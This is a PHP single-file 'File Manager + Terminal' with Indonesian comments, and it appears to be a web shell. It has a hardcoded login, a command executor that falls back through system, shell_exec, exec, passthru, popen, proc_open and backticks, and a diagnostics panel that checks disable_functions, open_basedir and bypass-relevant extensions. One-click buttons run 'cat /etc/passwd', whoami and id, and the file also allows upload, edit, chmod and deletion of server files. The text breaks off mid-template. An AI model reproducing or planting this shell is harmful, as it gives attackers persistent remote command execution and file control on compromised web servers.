<?php
/**
 * Simple File Manager + Terminal
 * - Fix: redirect setelah eksekusi command sekarang tetap di terminal.
 * - UX: command dieksekusi via AJAX, tanpa reload halaman.
 */

session_start();

/* ------------------------- KONFIGURASI ------------------------- */
define('FM_USER',    'admin');
define('FM_PASS',    'Azzure1337@#$');
define('FM_ROOT',    realpath(__DIR__));
define('FM_TITLE',   'File Manager');
define('FM_MAX_UPLOAD', 50 * 1024 * 1024);
define('FM_TERM_ENABLE', true);
define('FM_TERM_HISTORY', 50);

/* ------------------------- HELPER ------------------------- */
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function fm_root() { return rtrim(FM_ROOT, DIRECTORY_SEPARATOR); }

function fm_safe_path($rel) {
    $rel = str_replace('\\', '/', (string)$rel);
    $rel = trim($rel, '/');
    if (strpos($rel, "\0") !== false) return null;

    $abs = fm_root();
    if ($rel !== '') $abs .= '/' . $rel;

    $real = realpath($abs);
    if ($real === false) {
        $parent = realpath(dirname($abs));
        if ($parent === false) return null;
        if (strpos($parent . '/', fm_root() . '/') !== 0 && $parent !== fm_root()) return null;
        return dirname($parent) . '/' . basename($abs);
    }
    if ($real !== fm_root() && strpos($real . '/', fm_root() . '/') !== 0) return null;
    return $real;
}

function fm_resolve_input($input) {
    $raw   = (string)$input;
    $input = str_replace('\\', '/', trim($raw));

    $info = array(
        'raw'      => $raw,
        'input'    => $input,
        'root'     => fm_root(),
        'resolved' => null,
        'kind'     => 'relative',
    );

    if ($input === '' || $input === '/') {
        return array('rel' => '', 'err' => null, 'info' => $info);
    }
    if (strpos($input, "\0") !== false) {
        return array('rel' => null, 'err' => 'Input mengandung byte null.', 'info' => $info);
    }

    $root      = fm_root();
    $rootSlash = $root . '/';

    $inside = function ($path) use ($root, $rootSlash) {
        return $path === $root || strpos($path . '/', $rootSlash) === 0;
    };
    $rel_of = function ($path) use ($root, $rootSlash) {
        return ($path === $root) ? '' : substr($path, strlen($rootSlash));
    };

    if ($input[0] === '/') {
        $info['kind'] = 'absolute';
        $real = @realpath($input);

        if ($real !== false) {
            $info['resolved'] = $real;
            if ($inside($real)) {
                return array('rel' => $rel_of($real), 'err' => null, 'info' => $info);
            }
            return array('rel' => null,
                         'err' => sprintf('Path %s → resolve %s, di luar root %s.', $input, $real, $root),
                         'info' => $info);
        }

        if ($input === $root) {
            return array('rel' => '', 'err' => null, 'info' => $info);
        }
        if (strpos($input, $rootSlash) === 0) {
            $rel = substr($input, strlen($rootSlash));
            $info['resolved'] = $root . '/' . $rel;
            return array('rel' => $rel, 'err' => null, 'info' => $info);
        }

        $try    = ltrim($input, '/');
        $tryAbs = $rootSlash . $try;
        if (is_dir($tryAbs) || is_file($tryAbs)) {
            $info['kind']     = 'absolute-fallback-relatif';
            $info['resolved'] = $tryAbs;
            return array('rel' => $try, 'err' => null, 'info' => $info);
        }

        return array('rel' => null,
                     'err' => sprintf('Path %s tidak ada dan tidak di bawah root %s.', $input, $root),
                     'info' => $info);
    }

    $rel  = trim($input, '/');
    $full = $rootSlash . $rel;
    $real = @realpath($full);

    if ($real !== false) {
        $info['resolved'] = $real;
        if ($inside($real)) {
            return array('rel' => $rel_of($real), 'err' => null, 'info' => $info);
        }
        return array('rel' => null,
                     'err' => sprintf('Relatif %s → resolve %s, di luar root.', $input, $real),
                     'info' => $info);
    }

    $info['resolved'] = $full;
    return array('rel' => $rel, 'err' => null, 'info' => $info);
}

function fm_rel($abs) {
    $root = fm_root();
    if ($abs === $root) return '';
    return ltrim(substr($abs, strlen($root)), '/');
}

function fm_url($params = array()) {
    $q = $_GET;
    foreach ($params as $k => $v) $q[$k] = $v;
    return '?' . http_build_query($q);
}

function fm_size($bytes) {
    $u = array('B','KB','MB','GB','TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($u) - 1) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $u[$i];
}

function fm_csrf() {
    if (empty($_SESSION['fm_csrf'])) $_SESSION['fm_csrf'] = bin2hex(random_bytes(16));
    return $_SESSION['fm_csrf'];
}
function fm_check_csrf() {
    if (!hash_equals(fm_csrf(), $_POST['csrf'] ?? '')) {
        http_response_code(400); exit('Invalid CSRF token');
    }
}
function fm_flash($msg, $type = 'ok') { $_SESSION['fm_flash'] = array('m' => $msg, 't' => $type); }
function fm_take_flash() {
    if (empty($_SESSION['fm_flash'])) return null;
    $f = $_SESSION['fm_flash']; unset($_SESSION['fm_flash']); return $f;
}

function fm_rmdir_recursive($dir) {
    $ok = true;
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $p = $dir . '/' . $it;
        if (is_dir($p) && !is_link($p)) $ok = $ok && fm_rmdir_recursive($p);
        else $ok = $ok && @unlink($p);
    }
    return $ok && @rmdir($dir);
}

/* ------------------------- TERMINAL: EXEC CHAIN ------------------------- */
function fm_exec($cmd) {
    $cmd = (string)$cmd;
    if (trim($cmd) === '') {
        return array('out' => '', 'err' => 'Command kosong.', 'fn' => '');
    }

    if (function_exists('system')) {
        ob_start(); @system($cmd . ' 2>&1', $ret);
        return array('out' => ob_get_clean(), 'err' => $ret ? "exit=$ret" : '', 'fn' => 'system');
    }
    if (function_exists('shell_exec')) {
        return array('out' => (string)@shell_exec($cmd . ' 2>&1'), 'err' => '', 'fn' => 'shell_exec');
    }
    if (function_exists('exec')) {
        $lines = array(); @exec($cmd . ' 2>&1', $lines, $ret);
        return array('out' => implode("\n", $lines), 'err' => $ret ? "exit=$ret" : '', 'fn' => 'exec');
    }
    if (function_exists('passthru')) {
        ob_start(); @passthru($cmd . ' 2>&1', $ret);
        return array('out' => ob_get_clean(), 'err' => $ret ? "exit=$ret" : '', 'fn' => 'passthru');
    }
    if (function_exists('popen')) {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) {
            $out = ''; while (!feof($h)) $out .= fread($h, 8192);
            pclose($h); return array('out' => $out, 'err' => '', 'fn' => 'popen');
        }
    }
    if (function_exists('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w'));
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            return array('out' => $out, 'err' => $err, 'fn' => 'proc_open');
        }
    }
    if (function_exists('shell_exec')) {
        return array('out' => (string)@`$cmd 2>&1`, 'err' => '', 'fn' => 'backtick');
    }

    return array('out' => '', 'err' => 'Semua fungsi eksekusi diblokir.', 'fn' => 'none');
}

function fm_sysinfo() {
    $disabled = ini_get('disable_functions');
    $check = array('system','shell_exec','exec','passthru','popen','proc_open','pcntl_exec','putenv','mail','dl','imap_open','curl_exec','file_get_contents','file_put_contents','scandir','glob');
    $funcs = array();
    foreach ($check as $f) $funcs[$f] = function_exists($f);

    return array(
        'php_version'    => PHP_VERSION,
        'os'             => PHP_OS,
        'user'           => function_exists('get_current_user') ? @get_current_user() : '?',
        'cwd'            => function_exists('getcwd') ? @getcwd() : '?',
        'disable_functions' => $disabled ?: '(none)',
        'open_basedir'   => ini_get('open_basedir') ?: '(none)',
        'safe_mode'      => ini_get('safe_mode') ?: 'Off',
        'ffi_enabled'    => extension_loaded('FFI'),
        'imap_loaded'    => extension_loaded('imap'),
        'pcntl_loaded'   => extension_loaded('pcntl'),
        'funcs'          => $funcs,
    );
}

/* ------------------------- AUTH ------------------------- */
if (isset($_GET['logout'])) {
    $_SESSION = array(); session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?')); exit;
}

if (!isset($_SESSION['fm_ok'])) {
    $err = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === FM_USER && hash_equals(FM_PASS, $_POST['p'])) {
            session_regenerate_id(true);
            $_SESSION['fm_ok'] = true;
            header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?')); exit;
        }
        $err = 'Username / password salah.';
    }
    ?>
    <!DOCTYPE html><html><head><meta charset="utf-8">
    <title><?=h(FM_TITLE)?> — Login</title>
    <style>
        body{background:#111;color:#ddd;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
        form{background:#1c1c1c;padding:28px;border-radius:10px;min-width:280px}
        h1{margin:0 0 18px;font-size:18px;color:#4ea1ff}
        input{display:block;width:100%;padding:10px;margin-bottom:10px;border:1px solid #333;background:#0f0f0f;color:#eee;border-radius:6px}
        button{width:100%;padding:10px;border:0;border-radius:6px;background:#4ea1ff;color:#fff;font-weight:600;cursor:pointer}
        .err{color:#ff6b6b;margin-bottom:10px;font-size:13px}
    </style></head><body>
    <form method="post" autocomplete="off">
        <h1><?=h(FM_TITLE)?></h1>
        <?php if ($err): ?><div class="err"><?=h($err)?></div><?php endif; ?>
        <input name="u" placeholder="Username" required>
        <input name="p" type="password" placeholder="Password" required>
        <button type="submit">Masuk</button>
    </form>
    </body></html>
    <?php exit;
}

/* ------------------------- ROUTING ------------------------- */
$action = isset($_GET['a']) ? $_GET['a'] : 'list';
$csrf   = fm_csrf();
$flash  = fm_take_flash();

$resolve = fm_resolve_input($_GET['d'] ?? '');
$dirRel  = $resolve['rel'];

if ($dirRel === null) {
    $flash = array('m' => 'Navigasi ditolak: ' . $resolve['err'], 't' => 'err');
    $dirRel = '';
}

$dirAbs = fm_safe_path($dirRel);
if ($dirAbs === null) { $dirAbs = fm_root(); $dirRel = ''; }

if (!is_dir($dirAbs)) {
    if (is_file($dirAbs)) { header('Location: ' . fm_url(array('a' => 'edit', 'f' => fm_rel($dirAbs)))); exit; }
    if ($dirRel !== '') { $flash = array('m' => 'Direktori tidak ditemukan: ' . $dirRel, 't' => 'err'); }
    $dirAbs = fm_root(); $dirRel = '';
}

$rel       = fm_rel($dirAbs);
$parentRel = $rel === '' ? null : (dirname($rel) === '.' ? '' : dirname($rel));

/* ---------- DOWNLOAD ---------- */
if ($action === 'download') {
    $file = fm_safe_path($_GET['f'] ?? '');
    if ($file && is_file($file) && is_readable($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file); exit;
    }
    http_response_code(404); exit('File tidak ditemukan.');
}

/* ---------- POST ACTIONS ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    fm_check_csrf();
    $act = $_POST['act'] ?? '';
    try {
        if ($act === 'mkdir') {
            $name = trim($_POST['name'] ?? '');
            if ($name === '' || preg_match('#[\\\\/]|^\.\.?$#', $name)) throw new Exception('Nama folder tidak valid.');
            $target = fm_safe_path($rel ? $rel . '/' . $name : $name);
            if (!$target) throw new Exception('Path ditolak.');
            if (!@mkdir($target, 0755)) throw new Exception('Gagal membuat folder.');
            fm_flash('Folder dibuat: ' . $name);

        } elseif ($act === 'write') {
            $file = fm_safe_path($_POST['file'] ?? '');
            if (!$file || !is_file($file)) throw new Exception('File tidak valid.');
            if (!is_writable($file)) throw new Exception('File tidak writable.');
            if (file_put_contents($file, $_POST['content'] ?? '', LOCK_EX) === false) throw new Exception('Gagal menyimpan.');
            fm_flash('File disimpan: ' . basename($file));

        } elseif ($act === 'upload') {
            if (empty($_FILES['file']['name'])) throw new Exception('Tidak ada file.');
            $f = $_FILES['file'];
            if ($f['error'] !== UPLOAD_ERR_OK) throw new Exception('Upload error: ' . $f['error']);
            if ($f['size'] > FM_MAX_UPLOAD) throw new Exception('File terlalu besar.');
            $name = basename($f['name']);
            if ($name === '' || $name === '.' || $name === '..') throw new Exception('Nama file tidak valid.');
            $target = fm_safe_path($rel ? $rel . '/' . $name : $name);
            if (!$target) throw new Exception('Path ditolak.');
            if (!@move_uploaded_file($f['tmp_name'], $target)) throw new Exception('Gagal memindahkan file.');
            fm_flash('File di-upload: ' . $name);

        } elseif ($act === 'delete') {
            $file = fm_safe_path($_POST['file'] ?? '');
            if (!$file) throw new Exception('Path tidak valid.');
            if ($file === fm_root()) throw new Exception('Tidak boleh menghapus root.');
            if (is_dir($file)) {
                if (!fm_rmdir_recursive($file)) throw new Exception('Gagal hapus folder.');
                fm_flash('Folder dihapus.');
            } elseif (is_file($file)) {
                if (!@unlink($file)) throw new Exception('Gagal hapus file.');
                fm_flash('File dihapus.');
            } else throw new Exception('Target tidak ditemukan.');

        } elseif ($act === 'rename') {
            $file = fm_safe_path($_POST['file'] ?? '');
            $new  = trim($_POST['newname'] ?? '');
            if (!$file || !file_exists($file)) throw new Exception('Target tidak valid.');
            if ($new === '' || preg_match('#[\\\\/]#', $new)) throw new Exception('Nama baru tidak valid.');
            $parent = dirname($file);
            if ($parent !== fm_root() && strpos($parent . '/', fm_root() . '/') !== 0) throw new Exception('Path ditolak.');
            $target = $parent . '/' . $new;
            if (file_exists($target)) throw new Exception('Nama sudah dipakai.');
            if (!@rename($file, $target)) throw new Exception('Gagal rename.');
            fm_flash('Berhasil rename ke: ' . $new);

        } elseif ($act === 'chmod') {
            $file = fm_safe_path($_POST['file'] ?? '');
            $mode = $_POST['mode'] ?? '';
            if (!$file || !file_exists($file)) throw new Exception('Target tidak valid.');
            if (!preg_match('/^[0-7]{3,4}$/', $mode)) throw new Exception('Mode tidak valid.');
            if (!@chmod($file, octdec($mode))) throw new Exception('Gagal chmod.');
            fm_flash('Permission diubah ke ' . $mode);

        } elseif ($act === 'exec') {
            if (!FM_TERM_ENABLE) throw new Exception('Terminal dinonaktifkan.');
            $cmd = trim((string)($_POST['cmd'] ?? ''));
            if ($cmd === '') throw new Exception('Command kosong.');
            $res = fm_exec($cmd);
            if (!isset($_SESSION['fm_hist'])) $_SESSION['fm_hist'] = array();
            $_SESSION['fm_hist'][] = array('cmd' => $cmd, 'out' => $res['out'], 'err' => $res['err'], 'fn' => $res['fn'], 'ts' => time());
            if (count($_SESSION['fm_hist']) > FM_TERM_HISTORY) $_SESSION['fm_hist'] = array_slice($_SESSION['fm_hist'], -FM_TERM_HISTORY);
            fm_flash('Executed via ' . $res['fn'] . ': ' . $cmd);

        } elseif ($act === 'clearhist') {
            unset($_SESSION['fm_hist']);
            fm_flash('History cleared.');
        } else throw new Exception('Aksi tidak dikenal.');

    } catch (Exception $e) {
        fm_flash($e->getMessage(), 'err');
    }
    
    // FIX UTAMA: Cek $act, bukan $action, agar tidak terlempar ke file manager
    $redirect = ($act === 'exec' || $act === 'clearhist') ? 'terminal' : 'list';
    header('Location: ' . fm_url(array('d' => $rel, 'a' => $redirect)));
    exit;
}

/* ---------- VIEW: TERMINAL ---------- */
if ($action === 'terminal') {
    if (!FM_TERM_ENABLE) { http_response_code(403); exit('Terminal dinonaktifkan.'); }
    $hist = $_SESSION['fm_hist'] ?? array();
    $sys  = fm_sysinfo();
    ?>
    <!DOCTYPE html><html><head><meta charset="utf-8">
    <title>Terminal — <?=h(FM_TITLE)?></title>
    <style>
        :root{--bg:#0a0a0a;--panel:#141414;--b:#2a2a2a;--fg:#d4d4d4;--dim:#666;--acc:#4ea1ff;--ok:#7cffb2;--err:#ff9b9b}
        *{box-sizing:border-box}
        body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.5 Menlo,Consolas,monospace}
        header{display:flex;align-items:center;gap:10px;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--b);flex-wrap:wrap}
        header h1{margin:0;font-size:14px;color:var(--acc)}
        header a{color:var(--dim);text-decoration:none;font-size:12px}
        header a:hover{color:#fff}
        header .spacer{flex:1}
        .wrap{padding:16px 18px;max-width:1400px;margin:0 auto}
        .sysinfo{background:var(--panel);border:1px solid var(--b);border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:12px}
        .sysinfo h2{margin:0 0 10px;font-size:12px;color:var(--acc);font-weight:600;text-transform:uppercase}
        .sysinfo table{width:100%;border-collapse:collapse}
        .sysinfo td{padding:3px 8px 3px 0;vertical-align:top}
        .sysinfo td:first-child{color:var(--dim);width:180px;white-space:nowrap}
        .sysinfo code{background:#000;padding:1px 6px;border-radius:3px;color:#ffd9a0;font-size:11px}
        .fn-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:6px;margin-top:8px}
        .fn-item{padding:4px 8px;border-radius:4px;font-size:11px;display:flex;align-items:center;gap:6px}
        .fn-item.on{background:#0f2a17;color:var(--ok);border:1px solid #1e4a2a}
        .fn-item.off{background:#2a1010;color:var(--err);border:1px solid #4a1e1e}
        .fn-item .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
        .hist{background:var(--panel);border:1px solid var(--b);border-radius:8px;padding:14px 16px;margin-bottom:16px;max-height:60vh;overflow-y:auto}
        .hist .entry{margin-bottom:14px;padding-bottom:14px;border-bottom:1px solid #1e1e1e}
        .hist .entry:last-child{border-bottom:0;margin-bottom:0;padding-bottom:0}
        .hist .cmd{color:var(--acc);font-weight:600;margin-bottom:4px}
        .hist .cmd::before{content:"$ ";color:var(--dim)}
        .hist .meta{font-size:10.5px;color:var(--dim);margin-top:6px}
        .hist .meta .fn{background:#262626;padding:1px 6px;border-radius:3px;color:#cfcfcf}
        .hist pre{margin:0;padding:8px 10px;background:#050505;border-radius:5px;white-space:pre-wrap;word-break:break-all;color:#d4d4d4;font:12px/1.5 Menlo,Consolas,monospace;border-left:2px solid #333}
        .hist .err{color:var(--err);margin-top:4px;font-size:11.5px}
        .hist .empty{color:var(--dim);text-align:center;padding:20px;font-style:italic}
        form.term{display:flex;gap:8px;align-items:stretch}
        form.term input[type=text]{flex:1;background:#050505;color:#e6e6e6;border:1px solid #333;border-radius:6px;padding:10px 14px;font-family:Menlo,Consolas,monospace;font-size:13px;outline:none}
        form.term input[type=text]:focus{border-color:var(--acc)}
        form.term button{background:var(--acc);color:#fff;border:0;padding:10px 20px;border-radius:6px;font-weight:600;cursor:pointer;font-family:inherit}
        form.term button:hover{background:#3a8fe8}
        .quick{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
        .quick button{background:#262626;color:#cfcfcf;border:1px solid #333;border-radius:5px;padding:5px 10px;font-size:11px;cursor:pointer;font-family:inherit}
        .quick button:hover{background:#333;color:#fff}
        .flash{padding:10px 14px;border-radius:8px;margin-bottom:14px;font-size:12px}
        .flash.ok{background:#0f2a17;color:var(--ok);border:1px solid #1e4a2a}
        .flash.err{background:#2a1010;color:var(--err);border:1px solid #4a1e1e}
    </style></head><body>

    <header>
        <h1>⌨ Terminal</h1>
        <div class="spacer"></div>
        <a href="<?=h(fm_url(array('a'=>'list','d'=>$rel)))?>">📁 File Manager</a>
        <a href="?logout=1" onclick="return confirm('Logout?')">Logout</a>
    </header>

    <div class="wrap">
        <?php if ($flash): ?>
            <div class="flash <?=$flash['t']==='err'?'err':'ok'?>"><?=h($flash['m'])?></div>
        <?php endif; ?>

        <div class="sysinfo">
            <h2>Diagnostics</h2>
            <table>
                <tr><td>PHP</td><td><?=h($sys['php_version'])?></td></tr>
                <tr><td>OS</td><td><?=h($sys['os'])?></td></tr>
                <tr><td>User</td><td><?=h($sys['user'])?></td></tr>
                <tr><td>CWD</td><td><code><?=h($sys['cwd'])?></code></td></tr>
                <tr><td>disable_functions</td><td><code><?=h($sys['disable_functions'])?></code></td></tr>
                <tr><td>open_basedir</td><td><code><?=h($sys['open_basedir'])?></code></td></tr>
                <tr><td>safe_mode</td><td><?=h($sys['safe_mode'])?></td></tr>
                <tr><td>FFI / imap / pcntl</td><td><?=($sys['ffi_enabled']?'FFI:on ':'FFI:off ')?><?=($sys['imap_loaded']?'imap:on ':'imap:off ')?><?=($sys['pcntl_loaded']?'pcntl:on':'pcntl:off')?></td></tr>
            </table>
            <div class="fn-grid">
                <?php foreach ($sys['funcs'] as $name => $on): ?>
                    <div class="fn-item <?=$on?'on':'off'?>">
                        <span class="dot"></span><?=h($name)?>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="hist" id="term-hist">
            <?php if (empty($hist)): ?>
                <div class="empty" id="term-empty">Belum ada perintah. Ketik di bawah.</div>
            <?php else: ?>
                <?php foreach ($hist as $e): ?>
                    <div class="entry">
                        <div class="cmd"><?=h($e['cmd'])?></div>
                        <?php if ($e['out'] !== ''): ?><pre><?=h($e['out'])?></pre><?php endif; ?>
                        <?php if ($e['err'] !== ''): ?><div class="err">⚠ <?=h($e['err'])?></div><?php endif; ?>
                        <div class="meta">via <span class="fn"><?=h($e['fn'])?></span> · <?=date('H:i:s', $e['ts'])?></div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>

        <form class="term" id="term-form" method="post" action="<?=h(fm_url(array('a'=>'terminal','d'=>$rel)))?>" autocomplete="off">
            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
            <input type="hidden" name="act" value="exec">
            <input type="text" name="cmd" id="term-input" placeholder="id; whoami; ls -la; uname -a" autofocus>
            <button type="submit" id="term-btn">Run</button>
        </form>

        <div class="quick">
            <button type="button" onclick="qs('id')">id</button>
            <button type="button" onclick="qs('pwd')">pwd</button>
            <button type="button" onclick="qs('whoami')">whoami</button>
            <button type="button" onclick="qs('uname -a')">uname -a</button>
            <button type="button" onclick="qs('ls -la')">ls -la</button>
            <button type="button" onclick="qs('cat /etc/passwd')">cat /etc/passwd</button>
            <button type="button" onclick="qs('df -h')">df -h</button>
            <button type="button" onclick="qs('free -m')">free -m</button>
            <button type="button" onclick="qs('ps aux | head -20')">ps aux</button>
        </div>

        <form method="post" action="<?=h(fm_url(array('a'=>'terminal','d'=>$rel)))?>" style="margin-top:14px">
            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
            <input type="hidden" name="act" value="clearhist">
            <button type="submit" style="background:#4a1616;color:#ff9b9b;border:1px solid #6a2020;border-radius:5px;padding:6px 14px;cursor:pointer;font-size:11px">
                Clear history
            </button>
        </form>
    </div>

    <script>
    // Auto scroll ke bawah
    var hDiv = document.getElementById('term-hist');
    if (hDiv) hDiv.scrollTop = hDiv.scrollHeight;

    // Quick command runner
    function qs(cmd) {
        document.getElementById('term-input').value = cmd;
        document.getElementById('term-form').dispatchEvent(new Event('submit'));
    }

    // AJAX Handler (No Reload)
    document.getElementById('term-form').addEventListener('submit', function(e) {
        e.preventDefault();
        var form = this;
        var btn = document.getElementById('term-btn');
        var input = document.getElementById('term-input');
        var cmd = input.value.trim();
        if (!cmd) return;

        btn.textContent = '...';
        btn.disabled = true;

        var fd = new FormData(form);
        fetch(form.action, {
            method: 'POST',
            body: fd
        })
        .then(r => r.text())
        .then(html => {
            // Parse HTML response untuk mengambil history terbaru
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, 'text/html');
            
            // Ambil konten history dan ganti di DOM
            var newHist = doc.getElementById('term-hist');
            if (newHist) {
                hDiv.innerHTML = newHist.innerHTML;
                hDiv.scrollTop = hDiv.scrollHeight;
            }

            // Bersihkan input dan fokus kembali
            input.value = '';
            btn.textContent = 'Run';
            btn.disabled = false;
            input.focus();
        })
        .catch(err => {
            alert('Gagal: ' + err);
            btn.textContent = 'Run';
            btn.disabled = false;
        });
    });
    </script>
    </body></html>
    <?php exit;
}

/* ---------- VIEW: EDIT ---------- */
if ($action === 'edit') {
    $file = fm_safe_path($_GET['f'] ?? '');
    if (!$file || !is_file($file)) { http_response_code(404); exit('File tidak ditemukan.'); }
    if (filesize($file) > 2 * 1024 * 1024) { http_response_code(413); exit('File terlalu besar (>2 MB).'); }
    $content = file_get_contents($file);
    if (strpos($content, "\0") !== false) { http_response_code(415); exit('File biner tidak bisa diedit.'); }
    $dirOfFile = fm_rel(dirname($file));
    ?>
    <!DOCTYPE html><html><head><meta charset="utf-8">
    <title>Edit — <?=h(basename($file))?></title>
    <style>
        body{margin:0;background:#111;color:#ddd;font-family:system-ui,sans-serif}
        header{padding:10px 16px;background:#1c1c1c;display:flex;gap:10px;align-items:center;border-bottom:1px solid #333;flex-wrap:wrap}
        header a{color:#4ea1ff;text-decoration:none}
        header .name{color:#aaa;font-size:13px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        header code{color:#888;font-size:11px}
        textarea{width:100%;height:calc(100vh - 105px);box-sizing:border-box;background:#0a0a0a;
                 color:#e6e6e6;border:0;padding:12px;font-family:Menlo,Consolas,monospace;font-size:13px;outline:none}
        .bar{padding:10px 16px;background:#1c1c1c;display:flex;gap:10px;align-items:center;border-top:1px solid #333}
        button{padding:8px 16px;background:#4ea1ff;color:#fff;border:0;border-radius:6px;cursor:pointer;font-weight:600}
    </style></head><body>
    <header>
        <a href="<?=h(fm_url(array('a'=>'list','d'=>$dirOfFile)))?>">← Kembali</a>
        <span class="name"><?=h(fm_rel($file))?></span>
        <code><?=h($file)?></code>
    </header>
    <form method="post" action="<?=h(fm_url(array('a'=>'list','d'=>$dirOfFile)))?>">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="act" value="write">
        <input type="hidden" name="file" value="<?=h(fm_rel($file))?>">
        <textarea name="content" spellcheck="false"><?=h($content)?></textarea>
        <div class="bar">
            <button type="submit">Simpan</button>
            <span style="color:#888;font-size:12px"><?=h(basename($file))?> · <?=fm_size(filesize($file))?></span>
        </div>
    </form>
    </body></html>
    <?php exit;
}

/* ---------- VIEW: LIST ---------- */
$items = @scandir($dirAbs);
if ($items === false) { http_response_code(500); exit('Tidak bisa membaca folder.'); }

$dirs = array(); $files = array();
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    $abs = $dirAbs . '/' . $it;
    if (is_dir($abs)) $dirs[] = $it; else $files[] = $it;
}
natcasesort($dirs); natcasesort($files);
?>
<!DOCTYPE html><html><head><meta charset="utf-8">
<title><?=h(FM_TITLE)?> — /<?=h($rel)?></title>
<style>
    :root{--bg:#111;--panel:#1c1c1c;--b:#2a2a2a;--fg:#ddd;--dim:#888;--acc:#4ea1ff}
    *{box-sizing:border-box}
    body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.4 system-ui,sans-serif}
    header{display:flex;align-items:center;gap:10px;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--b);flex-wrap:wrap}
    header h1{margin:0;font-size:15px;color:var(--acc);white-space:nowrap}
    header a.logout,header a.term{color:var(--dim);text-decoration:none;font-size:12px}
    header a.logout:hover,header a.term:hover{color:#fff}
    header a.term{color:#f5c542;font-weight:600}
    .pathform{display:flex;gap:4px;align-items:center;flex:1;min-width:280px}
    .pathform input.pathinput{flex:1;min-width:0;background:#0a0a0a;color:#e6e6e6;border:1px solid #333;border-radius:6px;padding:7px 10px;font-family:Menlo,Consolas,monospace;font-size:12px;outline:none}
    .pathform input.pathinput:focus{border-color:var(--acc)}
    .pathform .nav{background:#262626;color:#ccc;border:1px solid #333;border-radius:6px;padding:7px 10px;cursor:pointer;font-size:13px;line-height:1}
    .pathform .nav:hover{background:#333;color:#fff}
    .pathform .nav.go{background:var(--acc);color:#fff;border-color:var(--acc);font-weight:600}
    .locbar{display:flex;align-items:center;gap:8px;padding:7px 18px;background:#141414;border-bottom:1px solid var(--b);font-size:12px;color:var(--dim);flex-wrap:wrap}
    .locbar code{color:#cfcfcf;font-family:Menlo,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .locbar .copy{background:#262626;color:#ccc;border:1px solid #333;border-radius:5px;padding:3px 8px;cursor:pointer;font-size:11px}
    .locbar .copy:hover{background:#333;color:#fff}
    .wrap{padding:16px 18px}
    .toolbar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
    .toolbar form{display:flex;gap:6px;align-items:center;background:var(--panel);padding:6px 8px;border-radius:8px;border:1px solid var(--b)}
    .toolbar input[type=text]{background:#0f0f0f;border:1px solid var(--b);color:#eee;border-radius:5px;padding:6px 8px;min-width:180px}
    .toolbar button{background:var(--acc);color:#fff;border:0;padding:6px 12px;border-radius:5px;cursor:pointer;font-weight:600}
    table{width:100%;border-collapse:collapse;background:var(--panel);border-radius:10px;overflow:hidden}
    th,td{padding:9px 12px;text-align:left;border-bottom:1px solid var(--b);font-size:13px}
    th{color:var(--dim);font-weight:500;background:#161616}
    tr:last-child td{border-bottom:0}
    tr:hover td{background:#202020}
    a.name{color:#e8e8e8;text-decoration:none}
    a.name:hover{color:var(--acc)}
    .icon{display:inline-block;width:20px;color:var(--dim)}
    .dir .icon{color:#f5c542}
    .actions{display:flex;gap:6px;flex-wrap:wrap}
    .actions a,.actions button{font-size:12px;padding:4px 8px;border-radius:5px;background:#262626;color:#ccc;border:1px solid #333;cursor:pointer;text-decoration:none}
    .actions button:hover,.actions a:hover{background:#333;color:#fff}
    .actions .danger:hover{background:#4a1616;color:#ff9b9b}
    .flash{padding:10px 14px;border-radius:8px;margin-bottom:14px;font-size:13px;line-height:1.5}
    .flash.ok{background:#0f2a17;color:#7cffb2;border:1px solid #1e4a2a}
    .flash.err{background:#2a1010;color:#ff9b9b;border:1px solid #4a1e1e}
    .flash code{background:#000;padding:1px 5px;border-radius:3px;color:#ffb3b3}
    .empty{color:var(--dim);text-align:center;padding:30px}
    .form-inline{display:inline}
    .form-inline input{background:#0f0f0f;border:1px solid #333;color:#ddd;padding:4px 6px;border-radius:4px;width:110px}
</style></head><body>

<header>
    <h1><?=h(FM_TITLE)?></h1>
    <form method="get" action="" class="pathform" autocomplete="off">
        <input type="hidden" name="a" value="list">
        <button type="button" class="nav" title="Naik satu level" onclick="this.form.d.value='<?=h($parentRel === null ? '' : $parentRel)?>';this.form.submit();">↑</button>
        <button type="button" class="nav" title="Ke root" onclick="this.form.d.value='';this.form.submit();">⌂</button>
        <input type="text" name="d" class="pathinput" value="<?=h($rel)?>" placeholder="path/relatif atau /abs/path" spellcheck="false">
        <button type="submit" class="nav go">Go</button>
    </form>
    <?php if (FM_TERM_ENABLE): ?>
